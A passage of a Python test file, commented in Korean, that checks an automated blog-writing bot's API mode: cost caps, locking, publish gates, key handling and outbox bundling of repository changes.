"""API 봇 = 월정액과 같은 글쓰기 작업 (운영자 11/12 '언제든 api로 바꾸면 똑같이 돌아가게').

확인하는 것: 네 곳(글 작성 시각·수동·연속 작성·매일 점검)이 방식에 따라 routine / api_writer 로만 갈림,
매일 점검은 두 방식 모두, 관문 없이 공개하는 길이 없음, 하루 비용 상한·한 번에 1개·명령줄에 키 없음.
"""
import json
import os
import re
import sys
import tempfile
import unittest
from contextlib import ExitStack
from datetime import datetime
from pathlib import Path
from unittest import mock
from zoneinfo import ZoneInfo

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from bot import api_writer, publish_queue, run  # noqa: E402
from bot.settings import BotSettings  # noqa: E402

KEY = "sk-ant-api03-TESTKEYDONOTPRINT"


def settings(mode="bot", **extra):
    raw = {"write_mode": mode, "enabled": "1", "provider": "anthropic", "anthropic_key": KEY,
           "model": "claude-opus-5-5", "daily_cost_cap": "20", "maint_times": "", "direct_times": "", **extra}
    return BotSettings.from_option(raw, {})


class _Base(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        api_writer._launched = False
        patches = [mock.patch.object(api_writer, "LOCK_FILE", str(self.tmp / "writer.lock")),
                   mock.patch.object(api_writer, "STATUS_FILE", self.tmp / "status.json"),
                   mock.patch.object(api_writer, "LOCAL_QUEUE_DIR", self.tmp / "local-queue"),
                   mock.patch.object(api_writer, "WORKDIR", self.tmp / "repo"),
                   mock.patch.object(api_writer, "BASE", self.tmp),
                   mock.patch.object(api_writer, "CLAUDE_BIN", str(self.tmp / "claude")),
                   mock.patch.object(api_writer, "SKIP_NOTE_FILE", self.tmp / "skip-note.txt"),
                   mock.patch.object(api_writer, "OUTBOX", self.tmp / "outbox"),
                   mock.patch.object(api_writer, "OUTBOX_LOCK", str(self.tmp / "outbox.lock"))]
        (self.tmp / "claude").write_text("")
        for p in patches:
            p.start()
            self.addCleanup(p.stop)
        self.addCleanup(setattr, api_writer, "_launched", False)


class FixedDT(datetime):
    NOW = datetime(2026, 11, 12, 7, 41, tzinfo=ZoneInfo("Asia/Seoul"))

    @classmethod
    def now(cls, tz=None):
        return cls.NOW if tz else cls.NOW.replace(tzinfo=None)


class DispatchTest(_Base):
    """bot/run.py 의 네 곳이 fire_routine 한 곳을 거쳐 방식대로 갈리는지 (main 을 1분 실행처럼 돌림, 07:41)."""

    def run_main(self, s, manual=False, continuous=False, state=None, busy=False):
        state = state if state is not None else {"log": [], "dashboard_at": "2026-11-12 07:00"}
        quiet = {"save_state": None, "run_due_wp_cron": None, "purge_cache_if_changed": None, "pop_excluded": [],
                 "daily_review": None, "refresh_dashboard": None, "continuous_on": continuous, "writer2_on": True,
                 "set_continuous": None, "load_settings": s, "load_state": state}
        with ExitStack() as stack:  # 패치가 많아 with 한 줄로는 파이썬 3.10 의 중첩 한도를 넘음
            for name, value in quiet.items():
                stack.enter_context(mock.patch.object(run, name, return_value=value))
            stack.enter_context(mock.patch.object(run, "LOCK_FILE", str(self.tmp / "bot.lock")))
            stack.enter_context(mock.patch.object(run, "datetime", FixedDT))
            stack.enter_context(mock.patch.object(sys, "argv", ["bot.run"]))
            stack.enter_context(mock.patch("bot.server_stats.record", return_value=""))
            stack.enter_context(mock.patch.object(api_writer, "busy", return_value=busy))
            pop = stack.enter_context(mock.patch.object(run, "pop_manual_request", return_value=manual))
            api_fire = stack.enter_context(mock.patch.object(api_writer, "fire", return_value="시작"))
            cloud_fire = stack.enter_context(mock.patch.object(run.routine, "fire", return_value="https://claude.ai/x"))
            publish = stack.enter_context(mock.patch("bot.publisher.publish"))
            mark_ready = stack.enter_context(mock.patch("bot.schedule.mark_ready"))
            run.main()
        publish.assert_not_called()      # 1분 봇은 글을 직접 올리지 않음 (관문은 publish_queue)
        mark_ready.assert_not_called()
        return api_fire, cloud_fire, pop, state

    def check(self, mode, *expected_texts, **kw):
        api_fire, cloud_fire, _, state = self.run_main(settings(mode, **kw.pop("extra", {})), **kw)
        used, unused = (api_fire, cloud_fire) if mode == "bot" else (cloud_fire, api_fire)
        unused.assert_not_called()
        texts = [c.args[1] if mode == "bot" else c.args[2] for c in used.call_args_list]
        self.assertEqual(texts, list(expected_texts))
        self.assertTrue(state["log"][0]["ok"], state["log"][0])

    def test_four_call_sites_both_modes(self):
        for mode in ("bot", "direct"):
            with self.subTest(mode=mode, site="수동"):
                self.check(mode, "manual-request", manual=True)
            with self.subTest(mode=mode, site="글 작성 시각"):
                self.check(mode, "", extra={"direct_times": "07:40"})
            with self.subTest(mode=mode, site="매일 점검"):   # 11/12: 예전엔 월정액에서만 돌았음
                self.check(mode, "maintenance-check", extra={"maint_times": "07:40"})
            with self.subTest(mode=mode, site="연속 작성"):
                texts = [""] if mode == "bot" else ["slot-1", "slot-2"]   # 월정액은 두 칸, API 봇은 한 칸
                self.check(mode, *texts, continuous=True, state={"log": [], "dashboard_at": "2026-11-12 07:00"})

    def test_api_continuous_runs_one_slot(self):
        """API 봇은 서버 안에서 한 번에 1개 → 2번 칸을 시작하지 않음 (시작하면 '실행 중' 실패가 쌓여 연속 작성이 멈춤)."""
        api_fire, _, _, state = self.run_main(settings("bot"), continuous=True)
        self.assertEqual(api_fire.call_count, 1)
        self.assertNotIn("continuous_2", state)

    def test_busy_waits_and_keeps_request(self):
        """쓰는 중이면 시작하지 않고 미룸 — 수동 요청은 지우지 않고, 시각은 '했음'으로 적지 않음 (끝나면 3시간 안에 시작)."""
        api_fire, _, pop, state = self.run_main(settings("bot", direct_times="07:40", maint_times="07:40"), manual=True,
                                                busy=True)
        api_fire.assert_not_called()
        pop.assert_not_called()
        self.assertNotIn("direct_fired", state)
        self.assertNotIn("maint_fired", state)

    def test_api_off_switch_is_logged(self):
        s = settings("bot", enabled="0", direct_times="07:40")
        with mock.patch.object(api_writer, "_launch") as launch:
            state = {"log": []}
            self.assertFalse(run.fire_routine(state, s, "글 작성 07:40"))
        launch.assert_not_called()
        self.assertFalse(state["log"][0]["ok"])
        self.assertIn("API 봇 사용", state["log"][0]["msg"])

    def test_no_ungated_publish_path(self):
        """예전 API 봇 한 번 쓰기(create_one)는 관문 없이 공개 대기열에 넣었음 → 없앰."""
        self.assertFalse(hasattr(run, "create_one"))
        src = (ROOT / "bot" / "run.py").read_text(encoding="utf-8")
        for name in ("from .publisher import", "mark_ready", "write_article", "make_llm"):
            self.assertNotIn(name, src)


class StartGuardTest(_Base):
    def test_cost_cap_blocks_start(self):
        s = settings("bot", daily_cost_cap="5")
        self.assertIsNone(api_writer.start_problem(s, 1.0))
        self.assertAlmostEqual(api_writer.budget(s, 1.0), 4.0)           # 남은 몫이 이번 예산
        self.assertIn("하루 상한", api_writer.start_problem(s, 4.8))      # 0.5달러도 안 남음 → 내일
        with mock.patch.object(api_writer, "_launch") as launch:
            with self.assertRaises(api_writer.ApiWriterError):
                api_writer.fire(s, "", spent=5.0)
        launch.assert_not_called()
        self.assertEqual(api_writer.budget(settings("bot", daily_cost_cap="0"), 99), api_writer.RUN_MAX_USD)

    def test_cost_cap_rechecked_in_runner(self):
        logs = []
        with mock.patch("bot.settings.load_settings", return_value=settings("bot", daily_cost_cap="3")), \
                mock.patch("bot.state.load_state", return_value={"log": [], "spend": {datetime.now().strftime("%Y-%m-%d"): 3.0}}), \
                mock.patch.object(api_writer, "_log", side_effect=lambda ok, msg, cost=0.0: logs.append((ok, msg))), \
                mock.patch.object(api_writer, "run_session") as session:
            self.assertEqual(api_writer.run_once("", "글 작성 07:40"), 1)
        session.assert_not_called()
        self.assertIn("하루 상한", logs[-1][1])

    def test_needs_anthropic_key_and_install(self):
        self.assertIn("Anthropic", api_writer.start_problem(settings("bot", provider="gemini"), 0))
        self.assertIn("키", api_writer.start_problem(settings("bot", anthropic_key=""), 0))
        with mock.patch.object(api_writer, "CLAUDE_BIN", str(self.tmp / "none")):
            self.assertIn("설치", api_writer.start_problem(settings("bot"), 0))

    def test_lock_prevents_double_run(self):
        self.assertFalse(api_writer.busy())
        with api_writer._lock() as got:
            self.assertTrue(got)
            self.assertTrue(api_writer.busy())
            with mock.patch.object(api_writer, "_launch") as launch, self.assertRaises(api_writer.ApiWriterError):
                api_writer.fire(settings("bot"), "")
            launch.assert_not_called()
            with mock.patch.object(api_writer, "run_session") as session:
                self.assertEqual(api_writer.run_once("", "x"), 1)   # 따로 실행도 잠금을 못 잡으면 바로 끝냄
            session.assert_not_called()
        self.assertFalse(api_writer.busy())                          # 끝나면(죽어도) 잠금이 풀림

    def test_same_minute_second_fire_refused(self):
        with mock.patch.object(api_writer, "_launch") as launch:
            api_writer.fire(settings("bot"), "manual-request")
            with self.assertRaises(api_writer.ApiWriterError):
                api_writer.fire(settings("bot"), "")
        self.assertEqual(launch.call_count, 1)
        self.assertTrue(all(KEY not in a for a in launch.call_args.args[0]))  # 따로 실행 명령에도 키 없음


class CommandTest(_Base):
    def test_command_has_model_not_key(self):
        cmd = api_writer.claude_command("claude-opus-5-5", 4.0, "slot-1")
        self.assertEqual(cmd[cmd.index("--model") + 1], "claude-opus-5-5")
        self.assertEqual(cmd[cmd.index("--max-budget-usd") + 1], "4.00")
        self.assertEqual(cmd[cmd.index("--permission-mode") + 1], "dontAsk")
        self.assertIn("automation/daily-writer.md", cmd[2])
        self.assertIn("slot-1", cmd[2])
        self.assertNotIn("--dangerously-skip-permissions", cmd)
        env = api_writer.writer_env(KEY, "tok")
        self.assertEqual(env["ANTHROPIC_API_KEY"], KEY)
        self.assertEqual(env["FIRSTLAB_LOCAL"], "push")   # 보통은 저장소 일까지 (11/12 '지금하고 똑같은 작업')
        self.assertNotIn("ANTHROPIC_API_KEY", api_writer.writer_env())   # git 명령에는 키 없음
        self.assertEqual(api_writer.redact(f"x {KEY} y", KEY), "x *** y")

    def fake_session(self, result: dict, write: dict):
        """claude -p 대신: 작업 저장소 queue 에 파일을 쓰고 결과 JSON 을 내놓음."""
        queue = self.tmp / "repo" / "wordpress" / "queue"
        queue.mkdir(parents=True, exist_ok=True)
        calls = {}

        class Proc:
            pid, returncode = 12345, 0

            def __init__(self, cmd, **kw):
                calls["cmd"], calls["kw"] = cmd, kw
                for name, data in write.items():
                    (queue / name).write_text(json.dumps(data, ensure_ascii=False), encoding="utf-8")

            def communicate(self, timeout=None):
                return json.dumps(result), ""
        return Proc, calls, queue

    def run_once(self, result, write, cap="20", text="slot-1"):
        Proc, calls, queue = self.fake_session(result, write)
        logs = []
        with mock.patch("bot.settings.load_settings", return_value=settings("bot", daily_cost_cap=cap)), \
                mock.patch("bot.state.load_state", return_value={"log": []}), \
                mock.patch("bot.config.load_secrets", return_value={"FIRSTLAB_API_TOKEN": "site-token"}), \
                mock.patch.object(api_writer, "_log", side_effect=lambda ok, msg, cost=0.0: logs.append((ok, msg, cost))), \
                mock.patch.object(api_writer, "prepare_workdir"), \
                mock.patch.object(api_writer, "repo_mode", return_value=("1", "시험: 쉬는 중")), \
                mock.patch.object(api_writer, "note_repo_skipped"), \
                mock.patch.object(api_writer, "head_sha", return_value="base000"), \
                mock.patch.object(api_writer.subprocess, "Popen", Proc), \
                mock.patch.object(api_writer, "new_queue_files", side_effect=lambda env, ref="": sorted(queue.glob("*.json"))), \
                mock.patch.object(api_writer, "other_changes", return_value=[]), \
                mock.patch.object(publish_queue, "main") as publish, \
                mock.patch("bot.publish_queue._marker", return_value=self.tmp / "nomarker"):
            code = api_writer.run_once(text, "연속 작성 1번째")
        return code, calls, logs, publish

    def test_success_delivers_to_gates_and_records_cost(self):
        result = {"type": "result", "subtype": "success", "is_error": False, "total_cost_usd": 3.21, "result": "새 글 1편"}
        code, calls, logs, publish = self.run_once(result, {"new-post.json": {"keyword": "x", "status": "auto"}})
        self.assertEqual(code, 0)
        self.assertTrue(all(KEY not in a for a in calls["cmd"]))           # 명령줄에 키 없음
        self.assertEqual(calls["kw"]["env"]["ANTHROPIC_API_KEY"], KEY)     # 키는 환경 변수로만
        self.assertEqual(calls["kw"]["user"], api_writer.WRITER_USER)      # 권한 없는 전용 사용자
        self.assertTrue(calls["kw"]["start_new_session"])                  # 시간 초과 때 통째로 끝낼 수 있게
        publish.assert_called_once()                                       # 월정액과 같은 관문 (bot.publish_queue)
        local = sorted(p.name for p in (self.tmp / "local-queue").glob("*.json"))
        self.assertIn("new-post.json", local)
        done = [n for n in local if n.startswith("done-")]                # 끝 표시를 안 남겼으면 대신 (연속 작성용)
        self.assertEqual(len(done), 1)
        self.assertEqual(json.loads((self.tmp / "local-queue" / done[0]).read_text())["slot"], 1)
        self.assertTrue(logs[-1][0])
        self.assertAlmostEqual(logs[-1][2], 3.21)                          # add_spend → 하루 상한
        self.assertFalse((self.tmp / "status.json").exists())

    def test_maintenance_makes_no_done_file(self):
        """매일 점검은 글쓰기 실행이 아님 → 끝 표시를 대신 만들지 않음 (연속 작성이 '한 편 끝'으로 착각하지 않게). 보고는 봇 기록·알림 통로에."""
        result = {"type": "result", "subtype": "success", "is_error": False, "total_cost_usd": 0.3, "result": "이상 없음"}
        code, _, logs, publish = self.run_once(result, {}, text="maintenance-check")
        self.assertEqual(code, 0)
        publish.assert_not_called()
        self.assertFalse(list((self.tmp / "local-queue").glob("*.json")))
        self.assertIn("이상 없음", logs[-1][1])

    def test_failed_run_publishes_nothing(self):
        """끝까지 못 마친 실행(예산 초과·오류)의 결과는 버림 — 월정액도 마지막 push 전에 끊기면 아무것도 안 올라감."""
        result = {"type": "result", "subtype": "error_max_budget_usd", "is_error": True, "total_cost_usd": 4.0}
        code, _, logs, publish = self.run_once(result, {"half.json": {"keyword": "x"}})
        self.assertEqual(code, 1)
        publish.assert_not_called()
        self.assertFalse(list((self.tmp / "local-queue").glob("*.json")))
        self.assertFalse(logs[-1][0])
        self.assertIn("버림", logs[-1][1])
        self.assertAlmostEqual(logs[-1][2], 4.0)                           # 실패해도 쓴 비용은 셈

    def test_stale_status_is_reported(self):
        (self.tmp / "status.json").write_text(json.dumps({"started": "2026-11-12 03:00", "label": "글 작성 03:00"}))
        self.assertIn("멈춤", api_writer._stale_note())

    def test_only_new_queue_files_taken(self):
        dest = self.tmp / "local-queue"
        good, bad = self.tmp / "a.json", self.tmp / "b.json"
        good.write_text('{"type": "skip", "keywords": []}', encoding="utf-8")
        bad.write_text("not json", encoding="utf-8")
        self.assertEqual(api_writer.deliver([good, bad], dest), ["a.json"])
        self.assertEqual(api_writer.deliver([good], dest), [])            # 같은 내용은 다시 안 넣음


OK_RESULT = {"type": "result", "subtype": "success", "is_error": False, "total_cost_usd": 2.5, "result": "대기 글 검수 1편"}


class RepoModeTest(CommandTest):
    """운영자 11/12 '예비 필요 없고 그냥 api로 할 때 지금하고 똑같은 작업을': 토큰 등 새 설정 없이 세션은 저장소 일까지 다 하고
    (FIRSTLAB_LOCAL=push), 서버가 검사 → 새 글은 바로 같은 관문, 저장소 수정은 묶음(OUTBOX)으로 → GitHub Actions 가 main 에."""

    def run_repo(self, write, build=None, text="slot-1", stacked=None, health=None, result=OK_RESULT):
        Proc, calls, queue = self.fake_session(result, write)
        logs = []
        if health is not None:
            (self.tmp / "outbox").mkdir(exist_ok=True)
            (self.tmp / "outbox" / "health.json").write_text(json.dumps(health))
        build = build or mock.Mock(return_value=(b"BUNDLE", "head111", "orig000", ["wordpress/queue/new-post.json"], []))
        with mock.patch("bot.settings.load_settings", return_value=settings("bot")), \
                mock.patch("bot.state.load_state", return_value={"log": [], "review_target": {"post_id": 7}, "calc_yearly": [1, 2]}), \
                mock.patch("bot.config.load_secrets", return_value={"FIRSTLAB_API_TOKEN": "site-token"}), \
                mock.patch.object(api_writer, "_log", side_effect=lambda ok, msg, cost=0.0: logs.append((ok, msg, cost))), \
                mock.patch.object(api_writer, "prepare_workdir"), \
                mock.patch.object(api_writer, "stack_pending", return_value={} if stacked is None else stacked) as stack, \
                mock.patch.object(api_writer, "head_sha", return_value="base000"), \
                mock.patch.object(api_writer.subprocess, "Popen", Proc), \
                mock.patch.object(api_writer, "new_queue_files", side_effect=lambda env, ref="": sorted(queue.glob("*.json"))), \
                mock.patch.object(api_writer, "other_changes", return_value=[]), \
                mock.patch.object(api_writer, "write_done_in_workdir", return_value=None), \
                mock.patch.object(api_writer, "rename_collisions", side_effect=lambda files, env: files), \
                mock.patch.object(api_writer, "build_bundle", build), \
                mock.patch.object(publish_queue, "main") as publish, \
                mock.patch("bot.publish_queue._marker", return_value=self.tmp / "nomarker"):
            code = api_writer.run_once(text, "글 작성 07:40")
        return code, calls, logs, publish, build, stack

    def local(self):
        return sorted(p.name for p in (self.tmp / "local-queue").glob("*.json"))

    def test_no_extra_setup_session_does_repo_work(self):
        """GitHub 토큰 없이도 저장소 일까지 (FIRSTLAB_LOCAL=push). 서버에도 세션에도 GitHub 쓰기 비밀값이 없음."""
        code, calls, logs, publish, build, stack = self.run_repo({"new-post.json": {"keyword": "x"}})
        self.assertEqual(code, 0)
        self.assertEqual(calls["kw"]["env"]["FIRSTLAB_LOCAL"], "push")
        self.assertIn("FIRSTLAB_LOCAL=push", calls["cmd"][2])
        self.assertFalse([k for k in calls["kw"]["env"] if "GITHUB" in k])
        stack.assert_called_once()                       # 앞 실행 결과 위에서 시작 (같은 검수 두 번 안 함)
        self.assertEqual(build.call_args.args[1], "base000")
        src = (ROOT / "bot" / "api_writer.py").read_text(encoding="utf-8")
        self.assertNotIn("GITHUB_PUSH_TOKEN", src)       # 예전 토큰 길은 없앰 (한 길만)

    def test_success_publishes_now_and_leaves_bundle(self):
        """검사 통과: 새 글·끝 표시는 바로 같은 관문 (연속 작성이 GitHub 반영을 기다리지 않음), 저장소 수정은 묶음으로."""
        code, _, logs, publish, _, _ = self.run_repo({"new-post.json": {"keyword": "x"}, "done-1.json": {"type": "run_done"},
                                                      "reviewdone-7-1.json": {"type": "review_done", "post_id": 7}})
        self.assertEqual(self.local(), ["done-1.json", "new-post.json", "reviewdone-7-1.json"])
        publish.assert_called_once()
        self.assertEqual((self.tmp / "outbox" / "pending.bundle").read_bytes(), b"BUNDLE")
        meta = json.loads((self.tmp / "outbox" / "pending.json").read_text())
        self.assertEqual((meta["head"], meta["origin"]), ("head111", "orig000"))
        self.assertEqual(meta["runs"][-1]["label"], "글 작성 07:40")
        self.assertTrue(logs[-1][0])
        self.assertIn("GitHub 반영 대기", logs[-1][1])

    def test_bundle_keeps_oldest_since_and_runs(self):
        stacked = {"since": "2026-11-12 03:00", "runs": [{"label": "앞 실행"}]}
        self.run_repo({"new-post.json": {"keyword": "x"}}, stacked=stacked)
        meta = json.loads((self.tmp / "outbox" / "pending.json").read_text())
        self.assertEqual(meta["since"], "2026-11-12 03:00")         # 안 올라간 가장 오래된 결과 기준 (6시간 정리)
        self.assertEqual([r["label"] for r in meta["runs"]], ["앞 실행", "글 작성 07:40"])

    def test_failed_checks_no_bundle_but_keep_posts(self):
        """검사 실패 → 묶음 없음, 봇 기록에 실패한 검사 이름, 새 글·끝 표시는 대기 폴더로 (글이 안 사라짐),
        검수 끝 파일은 버림 (고친 내용이 저장소에 없는데 '검수 끝'·'공개 직전 재검수 끝'으로 처리되면 안 됨)."""
        failing = mock.Mock(side_effect=api_writer.PushFailed("검사 실패", ["BotTest.test_calc_rates"]))
        code, _, logs, publish, _, _ = self.run_repo(
            {"new-post.json": {"keyword": "x"}, "done-1.json": {"type": "run_done"},
             "reviewdone-7-1.json": {"type": "review_done", "post_id": 7, "prepublish": True}}, build=failing)
        self.assertEqual(self.local(), ["done-1.json", "new-post.json"])
        publish.assert_called_once()
        self.assertFalse((self.tmp / "outbox" / "pending.bundle").exists())
        fail = [m for ok, m, _ in logs if not ok]
        self.assertTrue(any("BotTest.test_calc_rates" in m and "main 에 안 올림" in m and "검수 끝 파일 1개는 버림" in m for m in fail), fail)
        self.assertTrue(logs[-1][0])   # 세션 자체는 성공 (다음 실행이 새 main 에서 다시 — 영원히 막히지 않음)

    def test_nothing_changed_no_bundle(self):
        build = mock.Mock(return_value=(b"", "", "", [], []))
        self.run_repo({"skip-1.json": {"type": "skip", "keywords": []}}, build=build)
        self.assertFalse((self.tmp / "outbox" / "pending.bundle").exists())
        self.assertIn("skip-1.json", self.local())

    def test_rest_mode_after_repeated_failures(self):
        """반영이 연속 실패하면 하루 쉬기 (같은 검수를 매번 다시 해 돈만 쓰지 않게) → 기한 뒤 다시 push (영원히 안 쉼)."""
        future = (datetime.now() + api_writer.timedelta(hours=5)).strftime("%Y-%m-%d %H:%M")
        for run_no in range(2):
            code, calls, logs, publish, build, stack = self.run_repo({"new-post.json": {"keyword": "x"}},
                                                                     health={"fails": 2, "rest_until": future, "last_why": "push 거절"})
            self.assertEqual(calls["kw"]["env"]["FIRSTLAB_LOCAL"], "1")
            build.assert_not_called()
            stack.assert_not_called()
            notes = [m for ok, m, _ in logs if "건너뜀" in m and "밀린 일" in m]
            self.assertEqual(len(notes), 1 if run_no == 0 else 0)    # 하루 한 번만
            if run_no == 0:
                self.assertIn("대기 글 검수 1건, 연초 기준값 2건", notes[0])
                self.assertIn("push 거절", notes[0])
        self.assertIn("new-post.json", self.local())
        past = (datetime.now() - api_writer.timedelta(hours=1)).strftime("%Y-%m-%d %H:%M")
        _, calls, _, _, build, _ = self.run_repo({"b.json": {"keyword": "y"}}, health={"fails": 2, "rest_until": past})
        self.assertEqual(calls["kw"]["env"]["FIRSTLAB_LOCAL"], "push")
        build.assert_called_once()

    def test_stack_conflict_skips_repo_work_this_run(self):
        build2 = mock.Mock()
        Proc, calls2, queue = self.fake_session(OK_RESULT, {"c.json": {"keyword": "z"}})
        logs2 = []
        with mock.patch("bot.settings.load_settings", return_value=settings("bot")), \
                mock.patch("bot.state.load_state", return_value={"log": []}), \
                mock.patch("bot.config.load_secrets", return_value={}), \
                mock.patch.object(api_writer, "_log", side_effect=lambda ok, msg, cost=0.0: logs2.append((ok, msg))), \
                mock.patch.object(api_writer, "prepare_workdir"), \
                mock.patch.object(api_writer, "stack_pending", return_value=None), \
                mock.patch.object(api_writer, "head_sha", return_value="base000"), \
                mock.patch.object(api_writer.subprocess, "Popen", Proc), \
                mock.patch.object(api_writer, "new_queue_files", side_effect=lambda env, ref="": sorted(queue.glob("*.json"))), \
                mock.patch.object(api_writer, "other_changes", return_value=[]), \
                mock.patch.object(api_writer, "build_bundle", build2), \
                mock.patch.object(publish_queue, "main"), \
                mock.patch("bot.publish_queue._marker", return_value=self.tmp / "nomarker"):
            self.assertEqual(api_writer.run_once("", "x"), 0)
        self.assertEqual(calls2["kw"]["env"]["FIRSTLAB_LOCAL"], "1")   # 충돌한 앞 묶음은 GitHub 쪽이 처리할 때까지 저장소 일 쉼
        build2.assert_not_called()
        self.assertTrue(any("충돌" in m for _, m in logs2))

    def test_maintenance_report_goes_to_alert_channel(self):
        """매일 점검: 월정액은 끝 메시지가 휴대폰 알림 → API 봇은 전문을 봇 기록에, 문제 수를 알림 통로(Health check)로."""
        res = {**OK_RESULT, "result": "문제 2건\n- 사진 채우기 실패\n- 보류 3편"}
        code, _, logs, publish, build, _ = self.run_repo({}, text="maintenance-check", result=res,
                                                          build=mock.Mock(return_value=(b"", "", "", [], [])))
        self.assertEqual(code, 0)
        report = api_writer.take_maint_report()
        self.assertEqual(report["problems"], 2)
        self.assertEqual(api_writer.take_maint_report(), {})            # 한 번만 보냄
        full = [m for ok, m, _ in logs if m.startswith("매일 점검 보고(API 봇)")]
        self.assertEqual(len(full), 1)
        self.assertIn("보류 3편", full[0])
        self.assertFalse(self.local())                                   # 점검은 끝 표시를 안 만듦

    def test_maintenance_failure_also_alerts(self):
        res = {"type": "result", "subtype": "error_during_execution", "is_error": True, "total_cost_usd": 0.1}
        self.run_repo({}, text="maintenance-check", result=res)
        self.assertEqual(api_writer.take_maint_report()["problems"], -2)

    def test_problem_count_parsing(self):
        self.assertEqual(api_writer.maint_problems("이상 없음\n품질 …"), 0)
        self.assertEqual(api_writer.maint_problems("문제 3건\n- a"), 3)
        self.assertEqual(api_writer.maint_problems("오늘 점검 결과입니다"), -1)   # 형식이 다르면 알림은 감
        guide = (ROOT / "automation" / "maintenance.md").read_text(encoding="utf-8")
        self.assertIn("첫 줄은 `이상 없음` 또는 `문제 N건`", guide)


class OutboxTest(_Base):
    """서버 쪽 반영 대기 묶음: 가져가기·결과·정리 — 영원히 남거나 같은 것을 무한 반복하지 않게 (설계 점검 2)."""

    def setUp(self):
        super().setUp()
        self.logs = []
        p = mock.patch.object(api_writer, "_log", side_effect=lambda ok, msg, cost=0.0: self.logs.append((ok, msg)))
        p.start()
        self.addCleanup(p.stop)

    def pend(self, head="h1", since=None):
        api_writer.save_pending(b"B-" + head.encode(), head, "o1", {"since": since} if since else {}, {"label": f"실행 {head}"})

    def test_claim_result_pushed(self):
        self.assertEqual(api_writer.outbox_claim(), {})
        self.pend()
        got = api_writer.outbox_claim()
        self.assertEqual((got["head"], got["tries"], got["runs"]), ("h1", 1, ["실행 h1"]))
        self.assertEqual(Path(got["path"]).read_bytes(), b"B-h1")
        self.assertFalse((self.tmp / "outbox" / "pending.bundle").exists())
        self.assertEqual(api_writer.outbox_result("other", "pushed", "s"), "stale")   # 다른 묶음 결과는 무시
        self.assertEqual(api_writer.outbox_result("h1", "pushed", "abcdef12"), "done")
        self.assertFalse((self.tmp / "outbox" / "claimed.bundle").exists())
        self.assertTrue(self.logs[-1][0])
        self.assertIn("main 에 올림 abcdef1", self.logs[-1][1])
        self.assertEqual(api_writer.outbox_claim(), {})

    def test_new_pending_supersedes_claimed(self):
        """가져간 묶음이 결과 없이 남았는데 새 대기 묶음이 생기면 새 것(앞 것을 포함)을 가져감."""
        self.pend("h1")
        api_writer.outbox_claim()
        self.pend("h2")
        got = api_writer.outbox_claim()
        self.assertEqual(got["head"], "h2")
        self.assertEqual(Path(got["path"]).read_bytes(), b"B-h2")
        self.assertFalse(list((self.tmp / "outbox").glob("failed/*")))

    def test_retry_then_give_up(self):
        self.pend()
        api_writer.outbox_claim()
        self.assertEqual(api_writer.outbox_result("h1", "retry", why="main 이 바뀜"), "retry")
        for tries in range(2, api_writer.CLAIM_TRIES + 1):
            self.assertEqual(api_writer.outbox_claim()["tries"], tries)
        self.assertEqual(api_writer.outbox_claim(), {})                  # 3번 결과 없이 끝나면 실패로 (무한 반복 금지)
        self.assertEqual(len(list((self.tmp / "outbox" / "failed").glob("*.bundle"))), 1)
        self.assertFalse(self.logs[-1][0])
        self.assertIn("main 이 바뀜", self.logs[-1][1])

    def test_failures_rest_one_day_then_retry(self):
        self.assertEqual(api_writer.repo_mode(), ("push", ""))
        for head in ("h1", "h2"):
            self.pend(head)
            api_writer.outbox_claim()
            self.assertEqual(api_writer.outbox_result(head, "failed", why="검사 실패: BotTest.test_x"), "failed")
        mode, why = api_writer.repo_mode()
        self.assertEqual(mode, "1")
        self.assertIn("BotTest.test_x", why)
        self.assertIn("저장소 일은 건너뜀", self.logs[-1][1])
        later = datetime.now() + api_writer.timedelta(hours=api_writer.UNHEALTHY_HOURS + 1)
        with mock.patch.object(api_writer, "_now", return_value=later):
            self.assertEqual(api_writer.repo_mode()[0], "push")             # 하루 뒤 다시 시도
        self.pend("h3")
        api_writer.outbox_claim()
        api_writer.outbox_result("h3", "already")
        self.assertEqual(json.loads((self.tmp / "outbox" / "health.json").read_text())["fails"], 0)

    def test_stale_pending_failed_by_housekeeping(self):
        """GitHub Actions 가 멈춰 6시간 넘게 안 가져가면 실패로 정리 (봇 기록 ❌ → 매일 점검이 알림)."""
        self.pend("h1", since="2026-11-12 00:00")
        with mock.patch.object(api_writer, "_now", return_value=datetime(2026, 11, 12, 7, 0)):
            api_writer.housekeeping()
        self.assertFalse((self.tmp / "outbox" / "pending.bundle").exists())
        self.assertEqual(len(list((self.tmp / "outbox" / "failed").glob("*.bundle"))), 1)
        self.assertIn("6시간", self.logs[-1][1])

    def test_cli_prints_json_last_line(self):
        self.pend()
        import io
        from contextlib import redirect_stdout
        buf = io.StringIO()
        with redirect_stdout(buf):
            self.assertEqual(api_writer.main(["outbox", "claim"]), 0)
        self.assertEqual(json.loads(buf.getvalue().splitlines()[-1])["head"], "h1")
        buf = io.StringIO()
        with redirect_stdout(buf):
            api_writer.main(["outbox", "result", "--head", "h1", "--status", "pushed", "--sha", "abc"])
        self.assertEqual(json.loads(buf.getvalue().splitlines()[-1]), {"result": "done"})

    def test_housekeeping_called_from_minute_bot(self):
        src = (ROOT / "bot" / "run.py").read_text(encoding="utf-8")
        self.assertIn("api_writer.housekeeping()", src)


def _plain_writer(cmd, env, timeout=300, cwd=None, binary=False):
    """테스트용 _as_writer: 사용자 전환 없이 같은 명령 (CI 는 root 가 아님)."""
    return api_writer.subprocess.run(cmd, cwd=cwd or api_writer.WORKDIR, env=env, capture_output=True, text=not binary,
                                     timeout=timeout)


SEED = {
    "wordpress/queue/old.json": "{}\n", "wordpress/patches.json": "[]\n", "bot/gate.py": "x = 1\n",
    "server/setup.sh": "echo hi\n", "README.md": "a\n", "automation/reviewed.txt": "1 첫 글\n",
    "automation/common_errors.py": "# 유형표 (시험용: 바꾸는 것 없음)\n",
    "automation/common-errors.md": "# 자주 틀린 유형\n",
    "tests/test_ok.py": "import unittest\n\n\nclass OkTest(unittest.TestCase):\n    def test_ok(self):\n        pass\n",
    "tests/test_calculators.mjs": "process.exit(0);\n",
}


class ApiSyncGitTest(_Base):
    """진짜 git 으로 처음부터 끝까지: 서버 작업 폴더 → 묶음(OUTBOX) → 다음 실행이 그 위에 쌓음 →
    GitHub 쪽(automation/api_sync.py)이 최신 main 위에서 검사(진짜 check_work) → main 에 fast-forward → 서버에 결과."""

    def git(self, *args, cwd=None):
        r = api_writer.subprocess.run(["git", *args], cwd=cwd, env=self.env, capture_output=True, text=True)
        self.assertEqual(r.returncode, 0, r.stderr)
